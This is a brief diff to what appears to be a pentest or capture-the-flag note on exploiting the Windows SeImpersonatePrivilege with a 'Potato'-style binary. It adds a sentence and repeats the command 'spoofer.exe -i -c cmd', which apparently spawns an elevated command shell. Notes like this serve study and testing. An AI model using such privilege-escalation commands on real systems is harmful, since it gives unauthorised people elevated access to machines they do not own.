@@ -1,4 +1,8 @@
 ### how to exploit SeImpersonatePrivilege using a juicePotato binary
+With potato we can easy use the followint command 
+``
+C:\Users\Public\Desktop>spoofer.exe -i -c cmd``
+
 
 ```
 C:\Users\Public\Desktop>spoofer.exe -i -c cmd
